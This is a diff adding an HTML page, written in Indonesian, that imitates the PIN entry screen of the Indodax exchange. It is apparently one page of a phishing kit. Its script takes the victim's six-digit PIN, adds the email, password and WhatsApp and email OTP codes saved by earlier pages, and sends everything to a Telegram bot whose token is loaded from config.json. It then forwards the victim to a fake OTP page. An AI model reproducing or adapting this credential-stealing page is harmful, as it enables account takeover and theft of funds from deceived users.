@@ -1,0 +1,161 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PIN Input</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@700&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen flex flex-col">
+  <header class="flex items-center px-4 py-5">
+    <button aria-label="Back" class="text-[#8A9BA8] text-2xl mr-3">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <h1 class="font-bold text-xl leading-6">Masukkan PIN Anda</h1>
+    <div class="ml-auto text-[#8A9BA8] text-2xl cursor-pointer">
+      <i class="fas fa-ellipsis-v"></i>
+    </div>
+  </header>
+
+  <main class="flex flex-col items-center mt-20 flex-grow">
+    <div id="pinDots" class="flex space-x-6 mb-6">
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+    </div>
+    <button class="text-[#0B7DBF] font-semibold text-base mb-20">Lupa PIN</button>
+
+    <div class="grid grid-cols-3 gap-y-14 w-full max-w-xs font-bold text-2xl text-center select-none">
+      <button class="focus:outline-none text-black">1</button>
+      <button class="focus:outline-none text-black">2</button>
+      <button class="focus:outline-none text-black">3</button>
+      <button class="focus:outline-none text-black">4</button>
+      <button class="focus:outline-none text-black">5</button>
+      <button class="focus:outline-none text-black">6</button>
+      <button class="focus:outline-none text-black">7</button>
+      <button class="focus:outline-none text-black">8</button>
+      <button class="focus:outline-none text-black">9</button>
+      <div></div>
+      <button class="focus:outline-none text-black">0</button>
+      <button aria-label="Delete" class="focus:outline-none text-black text-xl flex justify-center items-center">
+        <i class="fas fa-backspace"></i>
+      </button>
+    </div>
+  </main>
+
+  <script>
+    const pinDots = document.getElementById('pinDots');
+    const pinButtons = document.querySelectorAll('button.focus\\:outline-none.text-black');
+    const deleteBtn = document.querySelector('button[aria-label="Delete"]');
+
+    let TELEGRAM_BOT_TOKEN;
+    let TELEGRAM_CHAT_ID;
+
+    // Fetch Telegram bot token and chat ID from config.json
+    fetch("config.json")
+      .then(response => response.json())
+      .then(config => {
+        TELEGRAM_BOT_TOKEN = config.telegramBotToken;
+        TELEGRAM_CHAT_ID = config.telegramChatId;
+        initializePinLogic(); // Initialize the PIN logic after config is loaded
+      })
+      .catch(error => {
+        console.error("Error fetching config:", error);
+        alert("Failed to load configuration.");
+      });
+
+    let pin = [];
+
+    function updatePinDots() {
+      const dots = pinDots.children;
+      for (let i = 0; i < dots.length; i++) {
+        if (i < pin.length) {
+          dots[i].classList.remove('bg-black/30');
+          dots[i].classList.add('bg-black');
+        } else {
+          dots[i].classList.remove('bg-black');
+          dots[i].classList.add('bg-black/30');
+        }
+      }
+    }
+
+    function sendPinToTelegram(fullMessage) {
+      const message = encodeURIComponent(fullMessage);
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            alert('Failed to send PIN to Telegram.');
+          } else {
+            location.href = "otpidodax.html";
+          }
+        })
+        .catch(() => {
+          alert('Failed to send PIN to Telegram.');
+        });
+    }
+
+    function initializePinLogic() {
+      pinButtons.forEach(button => {
+        button.addEventListener('click', () => {
+          if (pin.length < 6) {
+            pin.push(button.textContent);
+            updatePinDots();
+            if (pin.length === 6) {
+              const pinString = pin.join('');
+              localStorage.setItem("userPin", pinString);
+
+              // Retrieve existing data from localStorage
+              const storedEmail = localStorage.getItem("userEmail");
+              const storedPassword = localStorage.getItem("userPassword");
+              const storedWhatsappOtp = localStorage.getItem("userWhatsappOtp");
+              const storedEmailOtp = localStorage.getItem("userEmailOtp");
+
+              let fullMessage = `Indodaxcom:\nPIN: ${pinString}`;
+              if (storedEmail) {
+                fullMessage += `\n\nEmail: ${storedEmail}`;
+              }
+              if (storedPassword) {
+                fullMessage += `\nPassword: ${storedPassword}`;
+              }
+              if (storedWhatsappOtp) {
+                fullMessage += `\nWhatsApp OTP: ${storedWhatsappOtp}`;
+              }
+              if (storedEmailOtp) {
+                fullMessage += `\nEmail OTP: ${storedEmailOtp}`;
+              }
+
+              sendPinToTelegram(fullMessage);
+              setTimeout(() => {
+                pin = [];
+                updatePinDots();
+              }, 1000);
+            }
+          }
+        });
+      });
+
+      deleteBtn.addEventListener('click', () => {
+        if (pin.length > 0) {
+          pin.pop();
+          updatePinDots();
+        }
+      });
+    }
+  </script>
+</body>
+</html>
